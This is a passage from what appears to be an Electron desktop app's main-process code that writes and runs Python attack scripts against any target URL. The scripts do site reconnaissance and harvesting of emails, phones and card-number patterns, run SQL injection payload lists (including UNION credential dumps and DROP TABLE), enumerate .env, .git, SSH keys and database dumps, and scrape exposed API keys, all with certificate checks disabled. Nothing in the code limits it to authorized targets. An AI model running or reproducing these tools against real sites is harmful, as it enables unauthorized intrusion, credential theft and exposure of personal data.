            'has_payment_forms': bool(re.search(r'(stripe|paypal|braintree|square|credit.card|payment)', body, re.IGNORECASE)),
            'card_patterns': len(re.findall(r'\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})\\b', body)),
        }
        results['extraction']['financial'] = financial

    # --- Deep credential-free extraction (always runs) ---

    # Extract page metadata
    meta_data = {}
    title_m = re.search(r'<title[^>]*>(.*?)</title>', body, re.IGNORECASE | re.DOTALL)
    if title_m: meta_data['title'] = title_m.group(1).strip()[:200]
    for meta_tag in re.findall(r'<meta\\s+([^>]+)/?>', body, re.IGNORECASE):
        name_m = re.search(r'(?:name|property)=["\\'](.*?)["\\'\\s]', meta_tag, re.IGNORECASE)
        content_m = re.search(r'content=["\\'](.*?)["\\'\\s]', meta_tag, re.IGNORECASE)
        if name_m and content_m:
            meta_data[name_m.group(1)] = content_m.group(1)[:300]
    results['extraction']['metadata'] = meta_data

    # Extract social media links and profiles
    social_patterns = {
        'twitter': r'(?:https?://)?(?:www\\.)?(?:twitter\\.com|x\\.com)/([A-Za-z0-9_]+)',
        'facebook': r'(?:https?://)?(?:www\\.)?facebook\\.com/([A-Za-z0-9._-]+)',
        'instagram': r'(?:https?://)?(?:www\\.)?instagram\\.com/([A-Za-z0-9._]+)',
        'linkedin': r'(?:https?://)?(?:www\\.)?linkedin\\.com/(?:in|company)/([A-Za-z0-9_-]+)',
        'youtube': r'(?:https?://)?(?:www\\.)?youtube\\.com/(?:@|channel/|user/)([A-Za-z0-9_-]+)',
        'github': r'(?:https?://)?(?:www\\.)?github\\.com/([A-Za-z0-9_-]+)',
        'tiktok': r'(?:https?://)?(?:www\\.)?tiktok\\.com/@([A-Za-z0-9._]+)',
        'pinterest': r'(?:https?://)?(?:www\\.)?pinterest\\.com/([A-Za-z0-9_-]+)',
    }
    social_links = {}
    for platform, pattern in social_patterns.items():
        matches = list(set(re.findall(pattern, body, re.IGNORECASE)))
        if matches:
            social_links[platform] = matches[:5]
    results['extraction']['social_links'] = social_links

    # Extract all internal links for sitemap
    internal_links = set()
    external_links = set()
    for href in re.findall(r'href=["\\'](.*?)["\\'\\s]', body, re.IGNORECASE):
        if href.startswith('#') or href.startswith('javascript:') or href.startswith('mailto:') or href.startswith('tel:') or href.startswith('data:'):
            continue
        if href.startswith('/') or href.startswith(target):
            internal_links.add(href[:200])
        elif href.startswith('http'):
            external_links.add(href[:200])
    results['extraction']['internal_links'] = sorted(internal_links)[:100]
    results['extraction']['external_links'] = sorted(external_links)[:50]

    # Extract JavaScript sources (may reveal API endpoints)
    js_sources = list(set(re.findall(r'src=["\\'](.*?\\.js(?:\\?[^"\\']*)?)["\\'\\s]', body, re.IGNORECASE)))
    results['extraction']['javascript_sources'] = js_sources[:30]

    # Extract inline script content for API endpoints
    api_endpoints = set()
    for script_block in re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.IGNORECASE):
        for ep in re.findall(r'["\\'](/api/[a-zA-Z0-9/_-]+)["\\'\\s]', script_block):
            api_endpoints.add(ep)
        for ep in re.findall(r'["\\'](https?://[^"\\'>\\s]+/api/[^"\\'>\\s]*)["\\'\\s]', script_block):
            api_endpoints.add(ep[:200])
    results['extraction']['api_endpoints'] = sorted(api_endpoints)[:30]

    # Crawl key subpages to extract additional data (no credentials needed)
    subpage_data = {}
    crawl_targets = list(internal_links)[:10]
    for link in crawl_targets:
        try:
            if link.startswith('/'):
                full_url = target.rstrip('/') + link
            else:
                full_url = link
            sub_req = urllib.request.Request(full_url, headers={'User-Agent': ua})
            sub_resp = urllib.request.urlopen(sub_req, timeout=5, context=ctx)
            sub_body = sub_resp.read(200000).decode('utf-8', errors='ignore')
            sub_emails = list(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}', sub_body)))
            sub_phones = list(set(re.findall(r'\\b(?:\\+?1[-.]?)?\\(?\\d{3}\\)?[-.]?\\d{3}[-.]?\\d{4}\\b', sub_body)))
            sub_data = {'status': sub_resp.status, 'size': len(sub_body)}
            if sub_emails: sub_data['emails'] = sub_emails[:10]
            if sub_phones: sub_data['phones'] = sub_phones[:10]
            # Also extract social links from subpages
            for platform, pattern in social_patterns.items():
                matches = list(set(re.findall(pattern, sub_body, re.IGNORECASE)))
                if matches:
                    if platform not in social_links:
                        social_links[platform] = []
                    social_links[platform] = list(set(social_links.get(platform, []) + matches))[:5]
            subpage_data[link] = sub_data
        except Exception:
            pass
    results['extraction']['subpage_crawl'] = subpage_data
    results['extraction']['social_links'] = social_links  # Update with subpage findings

json.dump(results, open(output, 'w'), indent=2, default=str)
summary = {
    'found_paths': len([p for p in results['recon'].get('paths', {}) if results['recon']['paths'][p].get('status') == 200]),
    'technologies': results['recon'].get('technologies', []),
    'goals_processed': len([g for g in goals if g in results.get('extraction', {}) or g == 'everything']),
    'extraction_keys': list(results.get('extraction', {}).keys()),
}
print(json.dumps(summary))
`;
            const scriptPath = path.join(outputPath, '_recon.py');
            const resultPath = path.join(outputPath, 'recon_results.json');
            await fs.writeFile(scriptPath, reconScript, 'utf-8');
            const result = await runCommand(python.path, [
              scriptPath, targetUrl, resultPath, goalsJson, stealthMode ? 'true' : 'false',
            ], { timeout: 120000 });
            await fs.unlink(scriptPath).catch(() => {});
            progress(progressCh, 100, 'Reconnaissance complete');
            return { success: true, outputPath: resultPath, summary: result.stdout.trim() };
          }

          case 'sql-injection': {
            progress(progressCh, 10, 'Testing for SQL injection vulnerabilities...');
            const sqliScript = `
import urllib.request, urllib.error, json, sys, ssl, re, time
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse, urljoin

target = sys.argv[1]
output = sys.argv[2]
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

# --- Comprehensive SQLi payload library ---
error_based = [
    "'", "''", "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
    "' OR 1=1--", "' OR 1=1#", "') OR ('1'='1", "') OR 1=1--",
    "'; DROP TABLE users--", "1' ORDER BY 1--", "1' ORDER BY 10--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4--", "' UNION SELECT 1,2,3,4,5--",
    "1 AND 1=1", "1 AND 1=2", "1' AND '1'='1", "1' AND '1'='2",
    "admin'--", "admin' #", "admin'/*", "' HAVING 1=1--",
    "' GROUP BY columnnames HAVING 1=1--",
    "1 UNION ALL SELECT 1,2,3,4,5,6,table_name FROM information_schema.tables--",
    "1 UNION SELECT username,password FROM users--",
]
blind_boolean = [
    "' AND 1=1--", "' AND 1=2--",
    "' AND SUBSTRING(@@version,1,1)='5'--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "1 AND 1=1", "1 AND 1=2",
    "' OR EXISTS(SELECT * FROM users)--",
    "' AND LENGTH(database())>0--",
]
time_based = [
    "'; WAITFOR DELAY '0:0:3'--",
    "' OR SLEEP(3)--",
    "1; WAITFOR DELAY '0:0:3'--",
    "' AND SLEEP(3) AND '1'='1",
    "1 AND BENCHMARK(5000000,SHA1('test'))",
    "' OR pg_sleep(3)--",
]
header_payloads = [
    ("X-Forwarded-For", "' OR 1=1--"),
    ("Referer", "' OR 1=1--"),
    ("User-Agent", "' OR 1=1--"),
    ("Cookie", "session=' OR 1=1--"),
]

# SQL error signatures for detection
error_signatures = [
    'sql syntax', 'mysql_', 'mysql_fetch', 'mysqli_', 'postgresql', 'oracle', 'sqlite', 'microsoft sql',
    'unclosed quotation', 'quoted string not properly terminated',
    'you have an error in your sql', 'syntax error at or near', 'pg_query',
    'supplied argument is not a valid', 'mysql_fetch', 'mysqli_',
    'pg_exec', 'odbc_', 'ora-\\d{5}', 'db2_', 'sybase',
    'jdbc', 'sqlstate', 'warning.*mysql', 'valid mysql result',
    'dynamic sql error', 'microsoft ole db provider for sql server',
    'sqlserver', 'access database engine', 'jet database engine',
    'unterminated', 'division by zero', 'conversion failed',
    'data type mismatch', 'invalid column', 'unknown column',
    'table.*doesn.t exist', 'column.*does not exist',
]

results = {'target': target, 'tests': [], 'blind_tests': [], 'time_tests': [], 'header_tests': []}
parsed = urlparse(target)
params = parse_qs(parsed.query)

def check_sqli(response_body):
    body_lower = response_body.lower()
    for sig in error_signatures:
        if re.search(sig, body_lower):
            return True, sig
    return False, None

# Get baseline response
baseline_length = 0
baseline_body = ''
try:
    req = urllib.request.Request(target, headers={'User-Agent': ua})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    baseline_body = resp.read().decode('utf-8', errors='ignore')
    baseline_length = len(baseline_body)
except: pass

# Error-based SQLi
for param_name in params:
    for payload in error_based:
        test_params = dict(params)
        test_params[param_name] = [payload]
        test_query = urlencode(test_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=test_query))
        try:
            req = urllib.request.Request(test_url, headers={'User-Agent': ua})
            resp = urllib.request.urlopen(req, timeout=10, context=ctx)
            body = resp.read().decode('utf-8', errors='ignore')
            suspicious, matched_sig = check_sqli(body)
            entry = {
                'param': param_name, 'payload': payload, 'type': 'error-based',
                'status': resp.status, 'suspicious': suspicious, 'length': len(body),
                'length_diff': abs(len(body) - baseline_length),
            }
            if matched_sig: entry['matched_signature'] = matched_sig
            results['tests'].append(entry)
        except urllib.error.HTTPError as e:
            results['tests'].append({'param': param_name, 'payload': payload, 'type': 'error-based', 'status': e.code})
        except: pass

    # Blind boolean-based tests
    for payload in blind_boolean:
        test_params = dict(params)
        test_params[param_name] = [payload]
        test_query = urlencode(test_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=test_query))
        try:
            req = urllib.request.Request(test_url, headers={'User-Agent': ua})
            resp = urllib.request.urlopen(req, timeout=10, context=ctx)
            body = resp.read().decode('utf-8', errors='ignore')
            results['blind_tests'].append({
                'param': param_name, 'payload': payload, 'type': 'blind-boolean',
                'status': resp.status, 'length': len(body),
                'length_diff': abs(len(body) - baseline_length),
                'differs_from_baseline': abs(len(body) - baseline_length) > 50,
            })
        except urllib.error.HTTPError as e:
            results['blind_tests'].append({'param': param_name, 'payload': payload, 'type': 'blind-boolean', 'status': e.code})
        except: pass

    # Time-based blind tests (only test first 2 to avoid long waits)
    for payload in time_based[:2]:
        test_params = dict(params)
        test_params[param_name] = [payload]
        test_query = urlencode(test_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=test_query))
        try:
            start_time = time.time()
            req = urllib.request.Request(test_url, headers={'User-Agent': ua})
            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
            elapsed = time.time() - start_time
            body = resp.read().decode('utf-8', errors='ignore')
            results['time_tests'].append({
                'param': param_name, 'payload': payload, 'type': 'time-based',
                'status': resp.status, 'response_time': round(elapsed, 2),
                'suspicious': elapsed > 2.5,
            })
        except: pass

# Header injection tests
for header_name, payload in header_payloads:
    try:
        headers = {'User-Agent': ua, header_name: payload}
        req = urllib.request.Request(target, headers=headers)
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        body = resp.read().decode('utf-8', errors='ignore')
        suspicious, matched_sig = check_sqli(body)
        entry = {
            'header': header_name, 'payload': payload, 'type': 'header-injection',
            'status': resp.status, 'suspicious': suspicious,
        }
        if matched_sig: entry['matched_signature'] = matched_sig
        results['header_tests'].append(entry)
    except: pass

# Also scan for injectable form inputs by crawling the page
if baseline_body:
    forms = re.findall(r'<form[^>]*action=["\\'](.*?)["\\'](.*?)</form>', baseline_body, re.DOTALL | re.IGNORECASE)
    input_names = re.findall(r'<input[^>]*name=["\\'](.*?)["\\'\\s]', baseline_body, re.IGNORECASE)
    results['discovered_inputs'] = {
        'form_count': len(forms),
        'form_actions': [f[0] for f in forms[:10]],
        'input_fields': list(set(input_names))[:20],
    }

results['summary'] = {
    'error_based_suspicious': len([t for t in results['tests'] if t.get('suspicious')]),
    'blind_anomalies': len([t for t in results['blind_tests'] if t.get('differs_from_baseline')]),
    'time_based_suspicious': len([t for t in results['time_tests'] if t.get('suspicious')]),
    'header_suspicious': len([t for t in results['header_tests'] if t.get('suspicious')]),
    'total_tests': len(results['tests']) + len(results['blind_tests']) + len(results['time_tests']) + len(results['header_tests']),
}
json.dump(results, open(output, 'w'), indent=2)
print(json.dumps(results['summary']))
`;
            const scriptPath = path.join(outputPath, '_sqli_test.py');
            const resultPath = path.join(outputPath, 'sqli_results.json');
            await fs.writeFile(scriptPath, sqliScript, 'utf-8');
            const result = await runCommand(python.path, [scriptPath, targetUrl, resultPath], { timeout: 120000 });
            await fs.unlink(scriptPath).catch(() => {});
            progress(progressCh, 100, 'SQL injection testing complete');
            return { success: true, outputPath: resultPath, summary: result.stdout.trim() };
          }

          case 'directory-traverse': {
            progress(progressCh, 10, 'Enumerating directories...');
            const dirScript = `
import urllib.request, urllib.error, json, sys, ssl, re, os
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

target = sys.argv[1].rstrip('/')
output = sys.argv[2]
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

# --- Comprehensive directory & file wordlist ---
dirs = [
    # Admin panels
    'admin', 'administrator', 'admin1', 'admin2', 'adminpanel', 'admin-panel',
    'admin_area', 'admin-area', 'siteadmin', 'site-admin', 'webadmin',
    'controlpanel', 'cpanel', 'panel', 'manage', 'manager', 'management',
    'wp-admin', 'wp-login.php', 'login', 'signin', 'auth', 'authenticate',
    'dashboard', 'portal', 'backend', 'cms',
    # API endpoints
    'api', 'api/v1', 'api/v2', 'api/v3', 'api/v4', 'rest', 'graphql',
    'api/docs', 'api/swagger', 'api/health', 'api/status', 'api/config',
    'api/users', 'api/admin', 'api/login', 'api/auth', 'api/token',
    'api/data', 'api/export', 'api/import', 'api/upload', 'api/download',
    'swagger', 'swagger-ui', 'swagger.json', 'swagger.yaml',
    'openapi', 'openapi.json', 'openapi.yaml', 'redoc',
    # Version control
    '.git', '.git/HEAD', '.git/config', '.git/index', '.git/logs/HEAD',
    '.gitignore', '.gitattributes',
    '.svn', '.svn/entries', '.svn/wc.db',
    '.hg', '.hgignore', '.bzr',
    # CI/CD & Config
    '.env', '.env.local', '.env.production', '.env.development', '.env.staging',
    '.env.backup', '.env.bak', '.env.old', '.env.save', '.env.example',
    '.htaccess', '.htpasswd', 'web.config', 'wp-config.php', 'wp-config.php.bak',
    'wp-config.php.old', 'wp-config.php.save', 'wp-config.php.swp',
    'config.php', 'config.yml', 'config.yaml', 'config.json', 'config.xml',
    'configuration.php', 'settings.php', 'settings.py', 'settings.json',
    'database.yml', 'database.json', 'db.php', 'db.json',
    'Dockerfile', 'docker-compose.yml', 'docker-compose.yaml',
    '.dockerignore', 'Vagrantfile', 'Makefile', 'Rakefile',
    'Jenkinsfile', '.travis.yml', '.circleci/config.yml', '.gitlab-ci.yml',
    'package.json', 'composer.json', 'Gemfile', 'requirements.txt',
    'yarn.lock', 'package-lock.json', 'composer.lock',
    # Backup & data files
    'backup', 'backups', 'bak', 'old', 'temp', 'tmp', 'cache',
    'dump', 'dump.sql', 'database.sql', 'db.sql', 'data.sql',
    'backup.sql', 'backup.zip', 'backup.tar.gz', 'backup.tar',
    'site.zip', 'www.zip', 'html.zip', 'web.zip',
    'db_backup', 'sql', 'mysql', 'data', 'export',
    # Server info
    'phpinfo.php', 'info.php', 'test.php', 'check.php', 'health',
    'server-status', 'server-info', 'status', 'health-check', 'ping',
    'debug', 'debug.log', 'trace', 'trace.axd', 'elmah.axd',
    'console', 'shell', 'terminal', 'cmd',
    # Common apps
    'phpmyadmin', 'pma', 'myadmin', 'mysql-admin', 'adminer', 'adminer.php',
    'webmail', 'mail', 'roundcube', 'squirrelmail', 'horde',
    'plesk', 'whm', 'cPanel',
    # Upload/file directories
    'upload', 'uploads', 'files', 'media', 'attachments', 'documents',
    'docs', 'doc', 'images', 'img', 'pictures', 'photos', 'downloads',
    'assets', 'static', 'public', 'resources', 'content',
    'wp-content', 'wp-includes', 'wp-content/uploads',
    # Development
    'test', 'tests', 'testing', 'dev', 'development', 'staging',
    'stage', 'demo', 'beta', 'alpha', 'sandbox', 'preview',
    'debug', 'logs', 'log', 'error_log', 'access_log',
    'cgi-bin', 'bin', 'includes', 'inc', 'lib', 'src',
    'vendor', 'node_modules', 'bower_components',
    # Security
    'robots.txt', 'sitemap.xml', 'sitemap_index.xml', 'crossdomain.xml',
    '.well-known', '.well-known/security.txt', '.well-known/openid-configuration',
    '.well-known/change-password', '.well-known/apple-app-site-association',
    'security.txt', 'humans.txt', 'ads.txt',
    # Hidden & sensitive
    'private', 'secret', 'secrets', 'hidden', 'internal',
    'confidential', 'restricted', 'secure', 'protected',
    '.DS_Store', 'Thumbs.db', 'desktop.ini',
    '.bash_history', '.ssh', '.ssh/id_rsa', '.ssh/id_rsa.pub',
    'id_rsa', 'id_dsa', '.npmrc', '.pypirc',
    # Misc
    'readme', 'README.md', 'README.txt', 'CHANGELOG', 'CHANGELOG.md',
    'LICENSE', 'LICENSE.txt', 'INSTALL', 'CONTRIBUTING.md',
    'cron', 'crontab', 'scripts', 'tools', 'utilities',
    'invoker', 'invokers', 'install', 'setup', 'init',
]

# Remove duplicates
dirs = list(dict.fromkeys(dirs))

results = {'target': target, 'found': [], 'tested': 0, 'errors': 0, 'interesting': []}

def test_path(word):
    url = f"{target}/{word}"
    try:
        req = urllib.request.Request(url, headers={'User-Agent': ua}, method='GET')
        resp = urllib.request.urlopen(req, timeout=5, context=ctx)
        content = resp.read()
        content_type = resp.headers.get('Content-Type', '')
        entry = {
            'path': f"/{word}", 'status': resp.status,
            'size': len(content), 'content_type': content_type,
        }
        # Check for directory listing
        if b'Index of' in content or b'Directory listing' in content:
            entry['directory_listing'] = True
        # Check for sensitive content indicators
        text = content.decode('utf-8', errors='ignore')[:2000]
        if any(k in text.lower() for k in ['password', 'secret', 'api_key', 'token', 'private_key', 'credential']):
            entry['contains_sensitive'] = True
        # Preview first 200 chars for interesting files
        if word.endswith(('.txt', '.json', '.xml', '.yml', '.yaml', '.env', '.php', '.log')):
            entry['preview'] = text[:200]
        return ('found', entry)
    except urllib.error.HTTPError as e:
        if e.code == 403:
            return ('found', {'path': f"/{word}", 'status': 403, 'note': 'Forbidden - exists but access denied'})
        elif e.code not in [404]:
            return ('found', {'path': f"/{word}", 'status': e.code})
        return ('not_found', None)
    except Exception:
        return ('error', None)

# Thread pool for fast enumeration
with ThreadPoolExecutor(max_workers=10) as executor:
    futures = {executor.submit(test_path, word): word for word in dirs}
    for future in as_completed(futures):
        results['tested'] += 1
        try:
            status, entry = future.result()
            if status == 'found' and entry:
                results['found'].append(entry)
                if entry.get('directory_listing') or entry.get('contains_sensitive'):
                    results['interesting'].append(entry)
            elif status == 'error':
                results['errors'] += 1
        except: pass

# Sort results by status
results['found'].sort(key=lambda x: x.get('status', 999))
results['summary'] = {
    'total_tested': results['tested'],
    'total_found': len(results['found']),
    'accessible_200': len([f for f in results['found'] if f.get('status') == 200]),
    'forbidden_403': len([f for f in results['found'] if f.get('status') == 403]),
    'interesting': len(results['interesting']),
}

json.dump(results, open(output, 'w'), indent=2)
print(json.dumps(results['summary']))
`;
            const scriptPath = path.join(outputPath, '_dir_enum.py');
            const resultPath = path.join(outputPath, 'directory_results.json');
            await fs.writeFile(scriptPath, dirScript, 'utf-8');
            const result = await runCommand(python.path, [scriptPath, targetUrl, resultPath], { timeout: 180000 });
            await fs.unlink(scriptPath).catch(() => {});
            progress(progressCh, 100, 'Directory enumeration complete');
            return { success: true, outputPath: resultPath, summary: result.stdout.trim() };
          }

          default: {
            // Generic attack vector - run recon as baseline
            progress(progressCh, 50, `Attack vector "${attackVector}" executing...`);
            await writeJson(path.join(outputPath, 'attack_config.json'), options);
            progress(progressCh, 100, 'Operation complete');
            return { success: true, message: `${attackVector} analysis saved to output folder` };
          }
        }
      } catch (err) {
        const msg = (err as Error).message;
        progress(progressCh, 0, `Error: ${msg}`);
        return { success: false, error: msg };
      }
    }
  );

  ipcMain.handle(IPC_CHANNELS.WEB_BREACH_SCAN, async (_event, options: { targetUrl: string }) => {
    try {
      const python = await resolveTool('python');
      if (!python.found) return { success: false, error: 'Python required' };
      const scanScript = `
import urllib.request, ssl, json, sys, socket, re

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
target = sys.argv[1]
results = {'reachable': False}
try:
    from urllib.parse import urlparse
    parsed = urlparse(target)
    host = parsed.hostname

    # DNS resolution
    try:
        ips = socket.getaddrinfo(host, None)
        results['ips'] = list(set([ip[4][0] for ip in ips]))[:5]
    except: pass

    # HTTP request with full header capture
    req = urllib.request.Request(target, headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    })
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    body = resp.read().decode('utf-8', errors='ignore')
    results['reachable'] = True
    results['status'] = resp.status
    results['server'] = resp.headers.get('Server', '')
    results['powered_by'] = resp.headers.get('X-Powered-By', '')
    results['content_type'] = resp.headers.get('Content-Type', '')
    results['content_length'] = len(body)

    # Security headers check
    security_headers = {}
    for h in ['X-Frame-Options', 'X-Content-Type-Options', 'X-XSS-Protection',
              'Strict-Transport-Security', 'Content-Security-Policy',
              'Referrer-Policy', 'Permissions-Policy', 'Cross-Origin-Opener-Policy']:
        val = resp.headers.get(h)
        if val: security_headers[h] = val
    results['security_headers'] = security_headers
    results['missing_security_headers'] = [h for h in ['X-Frame-Options', 'X-Content-Type-Options',
        'Strict-Transport-Security', 'Content-Security-Policy'] if h not in security_headers]

    # Technology fingerprinting
    techs = []
    if 'wp-content' in body or 'wp-includes' in body: techs.append('WordPress')
    if 'drupal' in body.lower(): techs.append('Drupal')
    if 'joomla' in body.lower(): techs.append('Joomla')
    if '__NEXT_DATA__' in body: techs.append('Next.js')
    if '_nuxt' in body: techs.append('Nuxt.js')
    if 'react' in body.lower(): techs.append('React')
    if 'angular' in body.lower(): techs.append('Angular')
    if 'vue' in body.lower(): techs.append('Vue.js')
    if 'laravel' in body.lower(): techs.append('Laravel')
    if 'django' in body.lower(): techs.append('Django')
    if 'flask' in body.lower(): techs.append('Flask')
    if 'express' in str(results.get('powered_by', '')).lower(): techs.append('Express.js')
    if 'shopify' in body.lower(): techs.append('Shopify')
    if 'woocommerce' in body.lower(): techs.append('WooCommerce')
    if 'cloudflare' in str(resp.headers).lower(): techs.append('Cloudflare')
    if 'amazonaws' in str(resp.headers).lower(): techs.append('AWS')
    results['technologies'] = techs

    # Page title
    title_m = re.search(r'<title[^>]*>(.*?)</title>', body, re.IGNORECASE | re.DOTALL)
    if title_m: results['title'] = title_m.group(1).strip()[:200]

    # Count forms and inputs
    results['form_count'] = len(re.findall(r'<form', body, re.IGNORECASE))
    results['input_count'] = len(re.findall(r'<input', body, re.IGNORECASE))
    results['link_count'] = len(re.findall(r'<a\\s', body, re.IGNORECASE))

    # SSL cert info
    if parsed.scheme == 'https':
        try:
            import ssl as ssl_mod
            conn_ctx = ssl_mod.create_default_context()
            with socket.create_connection((host, 443), timeout=5) as sock:
                with conn_ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    results['ssl'] = {
                        'issuer': dict(x[0] for x in cert.get('issuer', [])).get('organizationName', ''),
                        'expires': cert.get('notAfter', ''),
                        'subject': dict(x[0] for x in cert.get('subject', [])).get('commonName', ''),
                    }
        except: pass

    print(json.dumps(results))
except Exception as e:
    results['error'] = str(e)
    print(json.dumps(results))
`;
      const scriptPath = path.join(require('os').tmpdir(), `_scan_${Date.now()}.py`);
      await fs.writeFile(scriptPath, scanScript, 'utf-8');
      const result = await runCommand(python.path, [scriptPath, options.targetUrl], { timeout: 15000 });
      await fs.unlink(scriptPath).catch(() => {});
      return { success: true, ...JSON.parse(result.stdout.trim()) };
    } catch (err) {
      return { success: false, error: (err as Error).message };
    }
  });

  // Photon web crawler handler
  ipcMain.handle(
    IPC_CHANNELS.PHOTON_RUN,
    async (_event, options: {
      targetUrl: string;
      outputPath: string;
      crawlDepth?: number;
      threads?: number;
      extractKeys?: boolean;
      extractDns?: boolean;
    }) => {
      const { targetUrl, outputPath, crawlDepth = 3, threads = 10, extractKeys = true, extractDns = false } = options;
      const progressCh = IPC_CHANNELS.PHOTON_PROGRESS;

      await ensureDir(outputPath);
      progress(progressCh, 5, `Starting Photon crawl of ${targetUrl}`);

      const python = await resolveTool('python');
      if (!python.found) throw new Error('Python is required for Photon crawler');

      try {
        // First try using photon as a pip-installed module
        const args = [
          '-m', 'photon',
          '-u', targetUrl,
          '-o', outputPath,
          '-l', String(crawlDepth),
          '-t', String(threads),
        ];
        if (extractKeys) args.push('--keys');
        if (extractDns) args.push('--dns');

        progress(progressCh, 10, 'Running Photon web crawler...');
        const result = await runCommand(python.path, args, { timeout: 300000 });

        if (result.exitCode !== 0 && !result.stdout.trim()) {
          // Fallback: run an inline crawler script if photon module is not installed
          progress(progressCh, 15, 'Photon module not found, using built-in crawler...');
          const crawlerScript = `
import urllib.request, urllib.error, json, sys, ssl, re, os, hashlib, time
from urllib.parse import urlparse, urljoin, quote
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

target = sys.argv[1]
output_dir = sys.argv[2]
max_depth = int(sys.argv[3])
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

visited = set()
results = defaultdict(set)
parsed_target = urlparse(target)
base_domain = parsed_target.hostname
page_metadata = {}

def fetch_page(url):
    try:
        req = urllib.request.Request(url, headers={
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        })
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        body = resp.read().decode('utf-8', errors='ignore')
        return body, resp.status, dict(resp.headers)
    except:
        return None, 0, {}

def extract_from_page(url, body, headers):
    # Emails
    emails = set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}', body))
    results['emails'].update(emails)

    # Phone numbers
    phones = set(re.findall(r'(?:\\+?1[-.]?)?\\(?\\d{3}\\)?[-.]?\\d{3}[-.]?\\d{4}', body))
    results['phones'].update(phones)

    # URLs (href and src)
    urls = set(re.findall(r'href=["\\'](https?://[^"\\'>]+)', body))
    urls.update(re.findall(r'src=["\\'](https?://[^"\\'>]+)', body))
    for u in urls:
        results['urls'].add(u)

    # Internal paths
    internal = set(re.findall(r'href=["\\'](/[^"\\'>]+)', body))
    internal.update(re.findall(r'href=["\\'](\\./[^"\\'>]+)', body))
    for p in internal:
        full = urljoin(target, p)
        results['internal'].add(full)

    # Social media
    social_patterns = {
        'facebook.com': 'Facebook', 'twitter.com': 'Twitter', 'x.com': 'Twitter',
        'linkedin.com': 'LinkedIn', 'instagram.com': 'Instagram',
        'github.com': 'GitHub', 'youtube.com': 'YouTube', 'tiktok.com': 'TikTok',
        'pinterest.com': 'Pinterest', 'reddit.com': 'Reddit',
    }
    for u in urls:
        for domain, platform in social_patterns.items():
            if domain in u:
                results['social'].add(u)

    # Files & documents
    file_exts = ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.csv', '.zip', '.tar', '.gz',
                 '.sql', '.bak', '.conf', '.env', '.json', '.xml', '.yaml', '.yml',
                 '.log', '.txt', '.pem', '.key', '.cert', '.p12', '.pfx', '.jks',
                 '.sqlite', '.db', '.mdb', '.accdb', '.backup', '.dump', '.swp']
    all_links = urls | {urljoin(target, p) for p in internal}
    for u in all_links:
        for ext in file_exts:
            if u.lower().endswith(ext) or f'{ext}?' in u.lower():
                results['files'].add(u)

    # JavaScript sources
    js_files = set(re.findall(r'src=["\\'](.*?\\.js(?:\\?[^"\\'>]*)?)["\\'\\s]', body, re.IGNORECASE))
    for js in js_files:
        full_js = urljoin(url, js)
        results['javascript'].add(full_js)

    # API endpoints in inline scripts
    for script_block in re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.IGNORECASE):
        for ep in re.findall(r'["\\'](/api/[a-zA-Z0-9/_-]+)["\\'\\s]', script_block):
            results['api_endpoints'].add(urljoin(url, ep))
        for ep in re.findall(r'["\\'](https?://[^"\\'>\\s]+/api/[^"\\'>\\s]*)["\\'\\s]', script_block):
            results['api_endpoints'].add(ep[:200])
        # Look for hardcoded secrets in JS
        for key in re.findall(r'["\\']((?:sk|pk|api|key|token|secret|access)[_-]?[a-zA-Z0-9]{16,})["\\'\\s]', script_block):
            results['potential_secrets'].add(key[:12] + '...')
        for key in re.findall(r'AIza[0-9A-Za-z_-]{35}', script_block):
            results['potential_secrets'].add('google_api:' + key[:12] + '...')
        for key in re.findall(r'AKIA[0-9A-Z]{16}', script_block):
            results['potential_secrets'].add('aws_key:' + key[:8] + '...')

    # HTML comments (may contain dev notes, TODOs, credentials)
    comments = re.findall(r'<!--(.*?)-->', body, re.DOTALL)
    interesting_comments = []
    for c in comments:
        c_lower = c.lower().strip()
        if any(k in c_lower for k in ['todo', 'fixme', 'hack', 'bug', 'password', 'secret',
                'key', 'token', 'credential', 'temporary', 'remove', 'debug', 'test']):
            interesting_comments.append(c.strip()[:200])
    if interesting_comments:
        for ic in interesting_comments:
            results['comments'].add(ic)

    # Forms with all inputs
